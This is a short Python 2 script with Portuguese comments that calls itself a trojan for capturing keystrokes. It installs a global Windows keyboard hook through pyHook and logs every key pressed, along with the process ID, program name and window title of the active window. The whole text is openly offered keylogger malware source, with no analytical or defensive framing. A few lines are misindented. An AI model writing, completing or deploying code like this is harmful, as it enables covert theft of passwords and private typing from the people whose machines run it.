# Script de cavalo de troia para capturar teclas pressionadas
from ctypes import *
import pythoncom
import pyHook 
import win32clipboard
usuario   = windll.user32
kernel32 = windll.kernel32
dadosProc    = windll.psapi # funcao para pegar os dados dos processos
telaAtual = None
# esta função é chamada caso o usuário mude de processo
def processoAtual():
     alvo = usuario.GetForegroundWindow() # estabelece o manipulador da janela alvo
    # pega o ID do processo sendo executado
    idP = c_ulong(0)
    usuario.GetWindowThreadProcessId(alvo, byref(idP)) # pega o ID do processo
    idProc = "%d" % idP.value # atribui o id do processo
    # pega o nome do programa que executa o processo
    nomeProg = create_string_buffer("\x00" * 512)
    nomeProc = kernel32.OpenProcess(0x400 | 0x10, False, idP) # pega o nome do executável em uso
    dadosProc.GetModuleBaseNameA(nomeProc,None,byref(nomeProg),512) # pega o nome do processo executado pelo programa
     # pega o nome da tela sendo executada
    nomeTela = create_string_buffer("\x00" * 512)
    tamanho = usuario.GetWindowTextA(alvo, byref(nomeTela),512)
    # mostra todos os dados do processo que está sendo executado
    print "\n\n* * ID Processo: %s - %s - %s * *\n" % (idProc, nomeProg.value, nomeTela.value)
     # fecha os manipuladores (handles)
    kernel32.CloseHandle(alvo)
    kernel32.CloseHandle(nomeProc)
# esta função será chamada quando o usuário pressionar uma tecla    
def teclaPressionada(evento):
    global telaAtual   
    # verifica se há mudança de processo
    if evento.WindowName != telaAtual:
        telaAtual = evento.WindowName        
        processoAtual()
	# verifica qual tipo de tecla é pressionada
    if evento.Ascii > 32 and evento.Ascii < 127:
        print chr(evento.Ascii),
    else:
        print " <%s> " % evento.Key, # mostra a tecla padrão que foi pressionada
    return True
# cria o Hook e registra quando a tecla é pressionada 
tecla         = pyHook.HookManager() # gerenciador do Hook
tecla.KeyDown = teclaPressionada
tecla.HookKeyboard() # executa o hook de todas as teclas pressionadas
pythoncom.PumpMessages() # executa recursivamente